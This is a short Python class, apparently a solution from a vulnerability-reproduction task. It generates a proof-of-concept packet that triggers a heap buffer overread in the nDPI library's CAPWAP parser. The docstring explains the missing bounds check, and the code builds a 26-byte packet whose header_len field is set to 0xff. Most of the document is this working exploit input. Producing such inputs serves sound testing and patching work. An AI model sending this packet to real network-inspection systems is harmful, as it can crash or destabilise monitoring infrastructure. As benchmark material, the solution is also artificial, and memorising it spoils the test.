class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a heap buffer overread in
        the ndpi_search_setup_capwap function.

        The vulnerability occurs when parsing a CAPWAP data packet. A length
        field (`header_len`) within a sub-header (`capwap_80211_header`) is
        used to read subsequent data without proper bounds checking against the
        total packet length.

        To trigger this, we craft a packet that:
        1. Passes initial CAPWAP header validation. This includes a zeroed
           preamble and a 'T' flag set to 1, indicating a data channel packet.
        2. Sets the CAPWAP header length (`hlen`) to the minimum valid value
           (2), resulting in a total CAPWAP header length of 8 bytes.
        3. Is long enough to pass the preliminary size check, which verifies
           that the packet can contain both the CAPWAP header and the
           capwap_80211_header. The size of the packed capwap_80211_header
           struct is 17 bytes. The check is `payload_len > 8 + 17`. Thus, the
           minimum payload length is 26 bytes.
        4. Contains a large value in the `header_len` field of the
           capwap_80211_header. This causes the subsequent read to go out of
           bounds.
        """

        # CAPWAP Header (8 bytes)
        # - Preamble: 4 bytes, all zero.
        # - hlen_rid: 1 byte. hlen = 2 (total header len 8), rid = 0 -> 0x10.
        # - wbid_flags: 1 byte. T=1 (data channel) -> 0x04.
        # - fragment_id: 2 bytes, zero.
        capwap_header = b'\x00\x00\x00\x00\x10\x04\x00\x00'

        # CAPWAP 802.11 Header (17 bytes, packed structure)
        # - The 'header_len' field is at offset 15 within this struct.
        # - We set it to 0xff to cause a large overread.
        # - All other fields are zeroed.
        capwap_80211_header_part1 = b'\x00' * 15
        vulnerable_len = b'\xff'
        capwap_80211_header_part2 = b'\x00'
        capwap_80211_header = capwap_80211_header_part1 + vulnerable_len + capwap_80211_header_part2

        # Trailing data (1 byte)
        # This makes the total packet length 26 bytes (8 + 17 + 1), which is
        # the minimum required to pass the size check `payload_len > 25`.
        trailing_data = b'\x00'

        poc = capwap_header + capwap_80211_header + trailing_data
        
        return poc